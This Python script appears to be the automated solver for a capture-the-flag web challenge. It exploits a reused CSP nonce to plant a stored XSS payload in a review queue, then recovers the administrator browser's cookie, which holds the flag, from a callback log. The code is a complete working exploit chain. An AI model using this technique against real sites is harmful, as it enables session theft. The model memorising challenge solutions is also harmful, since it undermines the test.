#!/usr/bin/env python3
"""Independent HTTP/WebSocket player for the real Cursed Stale Policy browser chain."""
import json
import os
import re
import time
import urllib.request

import websocket

BASE = os.environ.get("TARGET_URL", "http://cursed-target:8000").rstrip("/")
EXPECTED = os.environ["EXPECTED_FLAG"]


def get(path):
    request = urllib.request.Request(BASE + path)
    with urllib.request.urlopen(request, timeout=15) as response:
        return response.status, response.headers, response.read().decode("utf-8", "replace")


def receive_json(ws, timeout=2):
    ws.settimeout(timeout)
    try:
        return json.loads(ws.recv())
    except websocket.WebSocketTimeoutException:
        return None


def main():
    if not re.fullmatch(r"TTP\{[a-z2-7]{16}\}", EXPECTED):
        raise SystemExit("Expected per-instance Flag has an invalid format")

    print("[1/6] Load the real CSP analyser and capture its response policy")
    status, first_headers, body = get("/")
    assert status == 200 and "CSP Evaluator" in body
    first_policy = first_headers.get("Content-Security-Policy")
    assert first_policy and "script-src" in first_policy

    print("[2/6] Request a second page and verify the nonce is reused")
    status, second_headers, _ = get("/guidelines")
    assert status == 200
    assert second_headers.get("Content-Security-Policy") == first_policy
    nonce_match = re.search(r"'nonce-([^']+)'", first_policy)
    assert nonce_match, "CSP response did not contain a nonce"
    nonce = nonce_match.group(1)

    print("[3/6] Read the cached policy through the public WebSocket action")
    ws_url = BASE.replace("http://", "ws://", 1) + "/ws"
    ws = websocket.create_connection(ws_url, timeout=10)
    ws.send(json.dumps({"type": "fetch_default_csp"}))
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline:
        message = receive_json(ws, 2)
        if message and message.get("type") == "default_csp":
            assert message.get("payload") == first_policy
            break
    else:
        raise AssertionError("WebSocket did not return the cached CSP policy")

    print("[4/6] Submit a nonce-bearing payload to the real Bull review queue")
    # The same-origin request carries the browser's cookie automatically.
    # The application's callback logger records the actual request headers.
    payload = (
        f'<script nonce="{nonce}">'
        "var proof = new XMLHttpRequest();"
        "proof.open('GET','/callback?proof=review',false);"
        "proof.send();"
        "</script>"
    )
    ws.send(json.dumps({"type": "trigger_xss", "payload": payload}))

    print("[5/6] Wait for target-local Puppeteer/Chromium and retrieve the callback request")
    deadline = time.monotonic() + 60
    cookie_header = None
    while time.monotonic() < deadline:
        ws.send(json.dumps({"type": "fetch_logs"}))
        message = receive_json(ws, 2)
        if not message or message.get("type") != "update_logs":
            continue
        for entry in message.get("payload", []):
            if (entry.get("args") or {}).get("proof") == "review":
                cookie_header = (entry.get("headers") or {}).get("cookie")
                if cookie_header:
                    break
        if cookie_header:
            break

    assert cookie_header, "No browser callback with a Cookie header was recorded"
    assert EXPECTED in cookie_header, "The administrator browser did not disclose the exact instance Flag"

    print("[6/6] Exact per-instance administrator Flag recovered through the real browser chain")
    print("PASS: stale CSP nonce -> stored XSS -> Puppeteer Chromium -> callback log -> exact Flag")
    ws.close()


if __name__ == "__main__":
    main()
